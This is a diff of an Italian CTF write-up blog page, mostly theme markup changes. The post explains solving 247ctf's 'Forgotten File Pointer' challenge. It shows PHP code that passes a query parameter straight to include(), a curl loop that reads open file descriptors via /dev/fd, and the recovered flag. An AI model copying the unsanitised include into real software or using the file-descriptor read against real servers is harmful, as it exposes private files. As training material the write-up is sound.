@@ -1,123 +1,130 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <meta property="og:url" content="/posts/ctf/247ctf-forgotten-file-pointer/">
-  <meta property="og:site_name" content="Alessio Maddaluno">
-  <meta property="og:title" content="247ctf Forgotten File Pointer">
-  <meta property="og:description" content="Forgotten File Pointer - WEB Platform: 247ctf Difficoltà: Moderate (Relativo alla piattaforma) Link: https://247ctf.com/ Descrizione 1 We have opened the flag, but forgot to read and print it. Can you access it anyway? In questa challenge ci viene fornito un endpoint che mostra il codice della pagina stessa e ci viene chiesto di recuperare la flag che si trova in un file.
-1 2 3 4 5 6 7 8 9 &lt;?">
-  <meta property="og:locale" content="en_us">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-10-22T21:19:07+02:00">
-    <meta property="article:modified_time" content="2025-10-22T21:19:07+02:00">
-    <meta property="article:tag" content="Ctf">
 
   
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="247ctf Forgotten File Pointer">
-  <meta name="twitter:description" content="Forgotten File Pointer - WEB Platform: 247ctf Difficoltà: Moderate (Relativo alla piattaforma) Link: https://247ctf.com/ Descrizione 1 We have opened the flag, but forgot to read and print it. Can you access it anyway? In questa challenge ci viene fornito un endpoint che mostra il codice della pagina stessa e ci viene chiesto di recuperare la flag che si trova in un file.
-1 2 3 4 5 6 7 8 9 &lt;?">
+  <script>
+    (function () {
+      var cfg = 'system';
+      var stored = null;
+      try { stored = localStorage.getItem('theme'); } catch (e) {}
+      var theme;
+      if (stored === 'light' || stored === 'dark') { theme = stored; }
+      else if (cfg === 'light' || cfg === 'dark') { theme = cfg; }
+      else { theme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'; }
+      document.documentElement.classList.add(theme);
+      try { localStorage.setItem('theme', theme); } catch (e) {}
+    })();
+  </script>
 
-  
-  
-
-
-  
   <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
-  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#181818">
-  <title>
-    
-    Alessio Maddaluno - 247ctf Forgotten File Pointer
-    
-  </title>
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#0d1117">
+
+  <title>247ctf Forgotten File Pointer · Alessio Maddaluno</title>
+
+  
+  <meta name="description" content="Forgotten File Pointer - WEB Platform: 247ctf Difficoltà: Moderate (Relativo alla piattaforma) Link: https://247ctf.com/ Descrizione We have opened the flag, but forgot to read and print it. Can you access it anyway? In questa challenge ci viene fornito un endpoint che mostra il codice della pagina stessa e ci viene chiesto di recuperare la flag che si trova in un file.
+&lt;?php $fp = fopen(&#34;/tmp/flag.txt&#34;, &#34;r&#34;); if($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;GET&#39; &amp;&amp; isset($_GET[&#39;include&#39;]) &amp;&amp; strlen($_GET[&#39;include&#39;]) &lt;= 10) { include($_GET[&#39;include&#39;]); } fclose($fp); echo highlight_file(__FILE__, true); ?">
+  
+
+  
+
   
   
-  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
   
   
   
-  <link rel="stylesheet" href="/minima.29874c9cb88122b1936fcf6cda9a95a08a8627e18b7b236e7e55d894448f4b74.css">
+  <link rel="stylesheet" href="/css/main.min.558f4744f60bbc700385d86be38a48095dbc3a1f6c652bd8889e6f4272408081.css" integrity="sha256-VY9HRPYLvHADhdhr44pICV28Oh9sZSvYiJ5vQnJAgIE=">
+
+  
+  <script>
+    window.CIPHER = {
+      switch: "[\"◐\",\"◑\"]",
+      selectable: true, searchFuse: "{\"ignorelocation\":true,\"iscasesensitive\":false,\"keys\":[\"title\",\"summary\",\"content\"],\"minmatchcharlength\":2,\"shouldsort\":true,\"threshold\":0.4}"
+      , searchIndex: "\/index.json"};
+  </script>
+
   
   
+  <script defer src="/js/main.min.3ad692e8496059d43ed768b1c4ae39ef8bf563e65424a3a46e2572aace339b91.js" integrity="sha256-OtaS6ElgWdQ&#43;12ixxK4574v1Y&#43;ZUJKOkbiVyqs4zm5E="></script>
+
   
-  <script defer type="text/javascript" src="/minima.b4ae047ec8a5d41d48d7cae74d94267b0f024e4da6246fd14a5b03256c4ebd0c.js"
-    integrity="sha256-tK4Efsil1B1I18rnTZQmew8CTk2mJG/RSlsDJWxOvQw="></script>
   
+
   
   
 </head>
-<script>
-  const theme_config = 'system'
-  const theme_light = theme_config === 'system' ? 'light' : theme_config;
-  let theme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : theme_light;
-  console.debug(theme);
-
-  try {
-    localStorage.setItem('theme', theme);
-    window.minima_theme = theme;
-    document.querySelector('html').classList.add(theme);
-  } catch (e) {
-    console.error(e);
-  }
-</script>
 
 <body>
-  <header class="mt-3 mb-8">
-  <div class="container mx-auto">
-    <nav class="flex justify-between items-center">
-      <div class="flex items-center">
-        
-        <div id="theme-switch" class="text-2xl cursor-pointer">🌝</div>
-      </div>
-      <ul class="flex items-center text-base font-semibold
-        whitespace-nowrap overflow-x-auto overflow-y-hidden">
-        
-        <li class="ml-2 mr-2">
-          
-          <a href='/'>Home</a>
-          
-        </li>
-        
-        <li class="ml-2 mr-2">
-          
-          <a href="/tags">Tags</a>
-          
-        </li>
-        
-      </ul>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      <span class="prompt">~$</span>Alessio Maddaluno
+    </a>
+
+    <nav class="nav">
       
+        
+        <a href="/">Home</a>
+      
+        
+        <a href="/tags">Tags</a>
+      
+      <button id="theme-toggle" class="theme-toggle" type="button" aria-label="Toggle theme">
+        ◐
+      </button>
     </nav>
   </div>
 </header>
 
+  <main class="site-main">
+    
 
+<article class="post-single has-toc">
+  <header class="post-header">
+    <h1 class="post-title">247ctf Forgotten File Pointer</h1>
+    
+    
+<div class="meta">
   
-<div class="container mx-auto">
-  <h1 class="text-4xl font-extrabold mt-6 mb-6">247ctf Forgotten File Pointer</h1>
-  <div class="mb-3 text-sm flex flex-col sm:flex-row sm:justify-between gap-2">
+  
+    <time datetime="2025-10-22">Oct 22, 2025</time>
+  
+  
+    <span class="dot">·</span><span>2 min read</span>
+  
+  
+    <span class="dot">·</span>
+    <span class="tags">
+      <a class="tag" href="/tags/ctf">#ctf</a>
+    </span>
+  
+  
+</div>
+
+  </header>
+
+  <div class="post-body">
     
-    <div class="flex flex-wrap items-center gap-1">
-      
-      
-      
-      <a class="mr-1" href="/tags/ctf">#ctf</a>
-      
-    </div>
-    
-    <div>
-      
-      Post at &mdash; Oct 22, 2025
-      
-      
-    </div>
-  </div>
-  <main class="mb-8">
-    <p></p>
-    <article class="md">
+
+
+<details class="toc" open>
+  <summary class="toc-title">Contents</summary>
+  <nav><nav id="TableOfContents">
+  <ul>
+    <li><a href="#descrizione">Descrizione</a></li>
+    <li><a href="#analisi">Analisi</a></li>
+    <li><a href="#soluzione">Soluzione</a></li>
+  </ul>
+</nav></nav>
+</details>
+
+
+    <div class="prose">
       <h1 id="forgotten-file-pointer---web">Forgotten File Pointer - WEB</h1>
 <ul>
 <li><strong>Platform:</strong> 247ctf</li>
@@ -125,40 +132,18 @@
 <li><strong>Link:</strong> <a href="https://247ctf.com/">https://247ctf.com/</a></li>
 </ul>
 <h2 id="descrizione">Descrizione</h2>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">We have opened the flag, but forgot to read and print it. Can you access it anyway?
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>In questa challenge ci viene fornito un endpoint che mostra il codice della pagina stessa e ci viene chiesto di recuperare la flag che si trova in un file.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
-</span></span><span class="line"><span class="cl">  <span class="nv">$fp</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;/tmp/flag.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;GET&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;include&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;include&#39;</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;include&#39;</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="nx">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>Il codice è abbastanza diretto e la vulnerabilità è evidente: viene passato alla funzione <code>include()</code> direttamente il query param &lsquo;include&rsquo; senza alcun tipo di sanificazione, dobbiamo solo trovare il modo di sfruttarlo!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>We have opened the flag, but forgot to read and print it. Can you access it anyway?
+</span></span></code></pre></div><p>In questa challenge ci viene fornito un endpoint che mostra il codice della pagina stessa e ci viene chiesto di recuperare la flag che si trova in un file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>  $fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/tmp/flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;GET&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;include&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strlen</span>($_GET[<span style="color:#e6db74">&#39;include&#39;</span>]) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">10</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">include</span>($_GET[<span style="color:#e6db74">&#39;include&#39;</span>]);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fclose</span>($fp);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Il codice è abbastanza diretto e la vulnerabilità è evidente: viene passato alla funzione <code>include()</code> direttamente il query param &lsquo;include&rsquo; senza alcun tipo di sanificazione, dobbiamo solo trovare il modo di sfruttarlo!</p>
 <h2 id="analisi">Analisi</h2>
 <p>Il file flag.txt viene aperto da PHP ma non viene mostrato direttamente. Tuttavia l&rsquo;if viene valutato prima della chiamata a <code>fclose($fp);</code>, quindi quando viene eseguita <code>include($_GET['include']);</code> il file è ancora aperto.</p>
 <p>La funzione <code>include()</code> ha la proprietà che, se le passi un semplice file di testo, ne stampa il contenuto. Basta quindi passare il nome del file che vogliamo leggere ovvero <code>/tmp/flag.txt</code> e il gioco è fatto.</p>
@@ -167,124 +152,93 @@
 <p>Per poter accedere ai file aperti dal processo possiamo rifarci a <code>/dev/fd</code>.</p>
 <p><code>/dev/fd</code> è una directory virtuale in Linux che contiene i file descriptor del processo in esecuzione.</p>
 <p>In pratica, è un modo per accedere agli stream aperti (stdin, stdout, stderr, socket, file, pipe, ecc.) come se fossero normali file nel filesystem. Ogni &ldquo;file&rdquo; all&rsquo;interno della directory rappresenta un file descriptor:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/dev/fd/0 -&gt; stdin  
-</span></span><span class="line"><span class="cl">/dev/fd/1 -&gt; stdout  
-</span></span><span class="line"><span class="cl">/dev/fd/2 -&gt; stderr  
-</span></span><span class="line"><span class="cl">/dev/fd/3, /dev/fd/4, … -&gt; altri file aperti
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Nel nostro caso dal momento che <code>/dev/fd/</code> è di 9 caratteri possiamo accedere direttamente ai file <code>/dev/fd/X</code> dove X è compreso tra 0 a 9, quindi i file descriptor di 1 cifra. A questo punto possiamo provarli tutti facilmente:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="o">{</span>0..10<span class="o">}</span><span class="p">;</span> <span class="k">do</span> curl https://97f0352ee0639764.247ctf.com?include<span class="o">=</span>/dev/fd/<span class="nv">$i</span> -s <span class="p">|</span> grep 247CTF<span class="o">{</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="nv">$i</span> -s <span class="p">;</span> <span class="k">done</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Attraverso un ciclo for andiamo ad eseguire curl e ricerchiamo la stringa <code>247CTF{</code>. Dopo qualche secondo, abbiamo la flag!</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">maimba@Saturn:~/$ <span class="k">for</span> i in <span class="o">{</span>0..10<span class="o">}</span><span class="p">;</span> <span class="k">do</span> curl https://97f0352ee0639764.247ctf.com?include<span class="o">=</span>/dev/fd/<span class="nv">$i</span> -s <span class="p">|</span> grep 247CTF<span class="o">{</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="nv">$i</span> -s <span class="p">;</span> <span class="k">done</span>
-</span></span><span class="line"><span class="cl">247CTF<span class="o">{</span>4be4e08685e2ed433dde9171e887761e<span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="m">10</span> -s
-</span></span></code></pre></td></tr></table>
-</div>
-</div>
-    </article>
-  </main>
-  
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.css"
-    integrity="sha384-Um5gpz1odJg5Z4HAmzPtgZKdTBHZdw8S29IecapCSB31ligYPhHQZMIlWLYQGVoc" crossorigin="anonymous">
-
-<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.js"
-    integrity="sha384-YNHdsYkH6gMx9y3mRkmcJ2mFUjTd0qNQQvY9VYZgQd7DcN7env35GzlmFaZ23JGp"
-    crossorigin="anonymous"></script>
-
-<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/contrib/auto-render.min.js"
-    integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"
-    crossorigin="anonymous"></script>
-
-<script>
-    document.addEventListener("DOMContentLoaded", function () {
-        renderMathInElement(document.body, {
-            
-            
-            delimiters: [
-                { left: '$$', right: '$$', display: true },
-                { left: '$', right: '$', display: false },
-                { left: '\\(', right: '\\)', display: false },
-                { left: '\\[', right: '\\]', display: true }
-            ],
-            
-            throwOnError: false
-        });
-    });
-</script>
-
-
-
-
-
-<script 
-  src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"
-  crossorigin="anonymous">
-</script>
-<script>
-  mermaid.init(undefined, 'code.language-mermaid')
-</script>
-
-
-
-
-</div>
-
-
-  <footer class="mt-8 mb-8">
-  <div class="container mx-auto">
-    <div class="mt-8 flex flex-col-reverse sm:flex-row sm:justify-between items-center">
-      <div class="text-center sm:text-left">
-        <p class="mt-0 text-sm">© 2026 AM</p>
-      </div>
-
-      <p class="flex items-center mt-0">
-        
-        <a class="icon ml-1 mr-1" href="mailto:alessio.maddaluno@gmail.com" title="email">
-          
-          <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 21" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><path d="M22 6l-10 7L2 6"/></svg>
-          
-        </a>
-        
-        <a class="icon ml-1 mr-1" href="https://github.com/alessiomaddaluno" title="github">
-          
-          <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
-          
-        </a>
-        
-        <a class="icon ml-1 mr-1" href="/index.xml" title="rss">
-          
-          <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 0 1 9 9M4 4a16 16 0 0 1 16 16"/><circle cx="5" cy="19" r="1"/></svg>
-          
-        </a>
-        
-      </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/dev/fd/0 -&gt; stdin  
+</span></span><span style="display:flex;"><span>/dev/fd/1 -&gt; stdout  
+</span></span><span style="display:flex;"><span>/dev/fd/2 -&gt; stderr  
+</span></span><span style="display:flex;"><span>/dev/fd/3, /dev/fd/4, … -&gt; altri file aperti
+</span></span></code></pre></div><p>Nel nostro caso dal momento che <code>/dev/fd/</code> è di 9 caratteri possiamo accedere direttamente ai file <code>/dev/fd/X</code> dove X è compreso tra 0 a 9, quindi i file descriptor di 1 cifra. A questo punto possiamo provarli tutti facilmente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>0..10<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span> curl https://97f0352ee0639764.247ctf.com?include<span style="color:#f92672">=</span>/dev/fd/$i -s | grep 247CTF<span style="color:#f92672">{</span> <span style="color:#f92672">&amp;&amp;</span> echo $i -s ; <span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>Attraverso un ciclo for andiamo ad eseguire curl e ricerchiamo la stringa <code>247CTF{</code>. Dopo qualche secondo, abbiamo la flag!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>maimba@Saturn:~/$ <span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>0..10<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span> curl https://97f0352ee0639764.247ctf.com?include<span style="color:#f92672">=</span>/dev/fd/$i -s | grep 247CTF<span style="color:#f92672">{</span> <span style="color:#f92672">&amp;&amp;</span> echo $i -s ; <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>247CTF<span style="color:#f92672">{</span>4be4e08685e2ed433dde9171e887761e<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">10</span> -s
+</span></span></code></pre></div>
     </div>
   </div>
-</footer>
-</body>
 
+  <footer class="post-footer">
+    
+
+<div class="author-card">
+  <img src="https://avatars.githubusercontent.com/u/39380241?v=4" alt="Alessio Maddaluno" loading="lazy">
+  <div>
+    <div class="name">Alessio Maddaluno</div>
+    <p class="bio">Currently living on Earth 🌍</p>
+  </div>
+</div>
+
+
+  </footer>
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p class="copyright">© 2026 AM</p>
+    
+    <nav class="socials">
+      
+      
+      <a href="mailto:alessio.maddaluno@gmail.com" title="email" rel="me"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg></a>
+      
+      
+      <a href="https://github.com/alessiomaddaluno" title="github" target="_blank" rel="noopener me"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg></a>
+      
+      
+      <a href="/index.xml" title="rss" target="_blank" rel="noopener me"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 0 1 9 9M4 4a16 16 0 0 1 16 16"/><circle cx="5" cy="19" r="1"/></svg></a>
+      
+    </nav>
+    
+  </div>
+</footer>
+
+  
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css"
+  integrity="sha384-nB0miv6/jRmo5UMMR1wu3Gz6NLsoTkbqJghGIsx//Rlm+ZU03BU6SQNC66uf4l5+" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js"
+  integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm/Yr2r3Dy4lfFg" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js"
+  integrity="sha384-43gviWU0YVjaDtb/GhzOouOXtZMP/7XUzwPTstBeZFe/+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    renderMathInElement(document.body, {
+      delimiters: [
+        { left: '$$', right: '$$', display: true },
+        { left: '$', right: '$', display: false },
+        { left: '\\(', right: '\\)', display: false },
+        { left: '\\[', right: '\\]', display: true }
+      ],
+      throwOnError: false
+    });
+  });
+</script>
+
+
+
+
+
+  
+<script type="module">
+  import mermaid from "https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs";
+  var dark = document.documentElement.classList.contains("dark");
+  mermaid.initialize({ startOnLoad: false, theme: dark ? "dark" : "neutral", securityLevel: "loose" });
+  await mermaid.run({ querySelector: "code.language-mermaid, pre.mermaid" });
+</script>
+
+
+
+
+</body>
 </html>
